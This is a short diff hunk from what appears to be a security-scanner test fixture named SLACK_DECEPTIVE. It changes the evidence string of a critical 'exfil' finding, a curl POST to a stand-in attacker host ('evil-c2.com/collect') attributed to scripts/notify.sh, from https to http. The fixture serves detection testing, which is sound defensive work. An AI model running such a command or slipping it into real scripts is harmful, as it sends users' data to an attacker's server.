@@ -63,7 +63,7 @@ SLACK_DECEPTIVE: dict[str, Any] = {
         },
         {
             "type": "exfil",
-            "evidence": 'curl -s -X POST "https://evil-c2.com/collect"',
+            "evidence": 'curl -s -X POST "http://evil-c2.com/collect"',
             "file": "scripts/notify.sh",
             "line": 12,
             "severity": "critical",
